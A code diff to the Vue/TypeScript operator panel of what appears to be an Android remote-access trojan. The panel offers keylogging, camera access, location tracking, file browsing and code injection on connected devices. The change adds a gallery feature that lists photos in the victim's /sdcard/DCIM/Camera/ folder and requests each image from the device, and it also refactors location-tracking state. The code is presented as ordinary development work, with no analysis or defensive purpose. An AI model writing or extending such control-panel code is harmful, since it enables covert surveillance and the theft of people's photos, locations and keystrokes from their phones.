@@ -107,7 +107,7 @@ const {
 } = useDeviceWebSocket();
 
 const screenControl = useScreenControl(send, deviceId);
-const deviceData = useDeviceData(send, deviceId);
+const deviceData = useDeviceData(send, deviceId, message);
 
 const screenData = ref<string | null>(null);
 const screenWidth = ref(1080);
@@ -128,8 +128,6 @@ const files = ref<FileItem[]>([]);
 const currentFilePath = ref('/sdcard');
 const apps = ref<AppInfo[]>([]);
 const keylogEntries = ref<KeylogEntry[]>([]);
-const locationInfo = ref<LocationInfo | null>(null);
-const locationLoading = ref(false);
 
 const cameraData = ref<string | null>(null);
 const isCameraActive = ref(false);
@@ -217,8 +215,37 @@ const handleMessage = (msg: WebSocketInboundMessage) => {
         }
         case 'files': {
             const filesMsg = msg as FilesDataMessage;
-            files.value = parseFilesData(filesMsg.data);
-            deviceData.loading.value.files = false;
+            const allFiles = parseFilesData(filesMsg.data);
+            
+            if (galleryLoading.value) {
+                const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'];
+                const imageFiles = allFiles.filter(f => !f.isDirectory && imageExtensions.some(ext => 
+                    f.name.toLowerCase().endsWith(ext)
+                ));
+                
+                galleryImages.value = imageFiles.map((f, index) => ({
+                    id: `${f.path}/${f.name}`,
+                    name: f.name,
+                    path: `${f.path}/${f.name}`,
+                    thumbnail: '',
+                    size: parseInt(f.size) || 0,
+                    created_at: f.lastModified
+                }));
+                
+                galleryLoading.value = false;
+                
+                imageFiles.forEach(f => {
+                    send({
+                        itype: 'slr_panelsend',
+                        subc: 'viewfile',
+                        pid: props.device.uuid,
+                        filepath: `${f.path}/${f.name}`
+                    });
+                });
+            } else {
+                files.value = allFiles;
+                deviceData.loading.value.files = false;
+            }
             break;
         }
         case 'loadapps': {
@@ -255,8 +282,22 @@ const handleMessage = (msg: WebSocketInboundMessage) => {
         }
         case 'loc': {
             const locMsg = msg as LocationDataMessage;
-            locationInfo.value = parseLocationData(locMsg.data);
-            locationLoading.value = false;
+            deviceData.locationInfo.value = parseLocationData(locMsg.data);
+            deviceData.locationLoading.value = false;
+            break;
+        }
+        case 'thumb': {
+            const thumbMsg = msg as any;
+            const imagePath = thumbMsg.path;
+            const imageData = thumbMsg.data;
+            
+            const imageIndex = galleryImages.value.findIndex(img => 
+                (img.path + '/' + img.name) === imagePath || img.path === imagePath
+            );
+            
+            if (imageIndex !== -1) {
+                galleryImages.value[imageIndex].thumbnail = imageData;
+            }
             break;
         }
     }
@@ -601,7 +642,6 @@ const handleToggleKeylogMonitor = () => {
     isKeylogMonitoring.value = newState;
 };
 const handleRefreshLocation = () => {
-    locationLoading.value = true;
     deviceData.fetchLocation();
 };
 
@@ -630,8 +670,18 @@ const handleRefreshInject = () => {
 
 const handleRefreshGallery = () => {
     galleryLoading.value = true;
-    send({ itype: 'slr_panelsend', subc: 'getgallery', pid: props.device.uuid });
-    setTimeout(() => { galleryLoading.value = false; }, 2000);
+    send({ 
+        itype: 'slr_panelsend', 
+        subc: 'files', 
+        pid: props.device.uuid,
+        filepath: '/sdcard/DCIM/Camera/'
+    });
+    setTimeout(() => {
+        if (galleryLoading.value) {
+            galleryLoading.value = false;
+            message.warning('获取相册超时，设备可能未授予权限或离线');
+        }
+    }, 5000);
 };
 
 const handleDownloadGalleryImage = (path: string) => {
@@ -695,7 +745,6 @@ const loadTabData = (tab: string, force = false) => {
             deviceData.fetchFiles(currentFilePath.value);
             break;
         case 'location':
-            locationLoading.value = true;
             deviceData.fetchLocation();
             break;
         case 'inject':
@@ -1091,8 +1140,8 @@ const tabList = [
                                 />
                                 <LocationTab
                                     v-else-if="activeTab === 'location'"
-                                    :location="locationInfo"
-                                    :loading="locationLoading"
+                                    :location="deviceData.locationInfo.value"
+                                    :loading="deviceData.locationLoading.value"
                                     @refresh="handleRefreshLocation"
                                 />
                             </div>
